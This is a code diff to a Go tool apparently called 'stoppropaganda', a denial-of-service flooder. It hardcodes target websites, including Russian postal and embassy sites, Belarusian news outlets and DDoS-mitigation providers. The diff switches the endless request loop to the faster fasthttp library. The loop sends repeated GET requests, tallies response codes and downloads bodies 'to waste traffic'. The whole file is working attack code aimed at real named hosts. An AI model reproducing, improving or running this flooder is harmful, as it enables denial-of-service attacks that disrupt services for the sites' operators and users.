@@ -2,12 +2,12 @@ package stoppropaganda
 
 import (
 	"io"
-	"io/ioutil"
-	"net/http"
 	"net/url"
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/valyala/fasthttp"
 )
 
 // Source: https://twitter.com/FedorovMykhailo/status/1497642156076511233
@@ -130,8 +130,8 @@ var targetWebsites = map[string]struct{}{
 	"http://pochta.ru":             {},
 	"http://crimea-post.ru":        {},
 
-        // Embassy
-	"https://montreal.mid.ru":      {},
+	// Embassy
+	"https://montreal.mid.ru": {},
 
 	// Others
 	"https://109.207.1.118":          {},
@@ -267,9 +267,9 @@ var targetWebsites = map[string]struct{}{
 	"https://minsknews.by":      {},
 	"https://zarya.by":          {},
 	"https://grodnonews.by":     {},
-	
+
 	/* DDOS mitigation */
-        "https://ddos-guard.net/ru": {},
+	"https://ddos-guard.net/ru": {},
 	"https://stormwall.pro":     {},
 	"https://qrator.net/ru":     {},
 	"https://solidwall.ru":      {},
@@ -296,28 +296,29 @@ type Website struct {
 }
 
 func (ws *Website) Start(endpoint string) {
+	// Extract domain out of address
 	websiteURL, err := url.Parse(endpoint)
 	if err != nil {
 		panic(err)
 	}
-
-	// Create request
-	req, err := http.NewRequest("GET", endpoint, nil)
-	if err != nil {
-		panic(err)
-	}
-
-	// Set headers
-	req.Header.Set("Host", websiteURL.Host)
-	req.Header.Set("User-Agent", *flagUserAgent)
-	req.Header.Set("Accept", "*/*")
 
 	ws.WorkersStatus = "Initializing"
 	ws.pauseMux = &sync.Mutex{}
 	ws.paused = false
 	ws.dnsLastChecked = time.Now().Add(-1 * VALIDATE_DNS_EVERY) // this forces to validate on first run
 
+	// Create request
+	req := fasthttp.AcquireRequest()
+	req.SetRequestURI(endpoint)
+	req.Header.SetMethod(fasthttp.MethodGet)
+	req.Header.Set("Host", websiteURL.Host)
+	req.Header.Set("User-Agent", *flagUserAgent)
+	req.Header.Set("Accept", "*/*")
+
 	f := func() {
+		// Create response
+		resp := fasthttp.AcquireResponse()
+
 		for {
 			ws.pauseMux.Lock()
 			if time.Since(ws.dnsLastChecked) >= VALIDATE_DNS_EVERY {
@@ -365,57 +366,41 @@ func (ws *Website) Start(endpoint string) {
 			ws.pauseMux.Unlock()
 
 			// Perform request
-			resp, err := httpClient.Do(req)
+			err := httpClient.DoTimeout(req, resp, *flagTimeout)
 			if err != nil {
 				ws.mux.Lock()
 				ws.Requests++
 				ws.Errors++
-				switch {
-				case strings.HasSuffix(err.Error(), "(Client.Timeout exceeded while awaiting headers)"):
-					ws.LastErrorMsg = "Request timed out"
-				case strings.HasSuffix(err.Error(), "connection refused"):
-					ws.LastErrorMsg = "Connection refused"
-				case strings.HasSuffix(err.Error(), "EOF"):
-					ws.LastErrorMsg = "Lost connection (EOF)"
-				default:
-					ws.LastErrorMsg = err.Error()
-				}
+				ws.LastErrorMsg = err.Error()
 				ws.mux.Unlock()
 				continue
 			}
+			responseCode := resp.StatusCode()
 
 			// Increase counters
 			ws.mux.Lock()
 			ws.Requests++
-			if resp.StatusCode < 200 {
+			switch {
+			case responseCode < 200:
 				ws.Counter_code100++
-			} else if resp.StatusCode < 300 {
+			case responseCode < 300:
 				ws.Counter_code200++
-			} else if resp.StatusCode < 400 {
+			case responseCode < 400:
 				ws.Counter_code300++
-			} else if resp.StatusCode < 500 {
+			case responseCode < 500:
 				ws.Counter_code400++
-			} else {
+			default:
 				ws.Counter_code500++
 			}
 			ws.mux.Unlock()
 
-			// Download (and discard) response body to waste traffic
-			_, err = io.Copy(ioutil.Discard, resp.Body)
-			if err != nil {
+			// Download content, to waste traffic
+			if err = resp.BodyWriteTo(io.Discard); err != nil {
 				ws.mux.Lock()
 				ws.Errors++
-				switch {
-				case strings.HasSuffix(err.Error(), "(Client.Timeout exceeded while awaiting headers)"):
-					ws.LastErrorMsg = "Response body timed out"
-				case strings.HasSuffix(err.Error(), "EOF"):
-					ws.LastErrorMsg = "Lost connection (EOF)"
-				default:
-					ws.LastErrorMsg = err.Error()
-				}
+				ws.LastErrorMsg = err.Error()
 				ws.mux.Unlock()
 			}
-			resp.Body.Close()
 		}
 	}
 
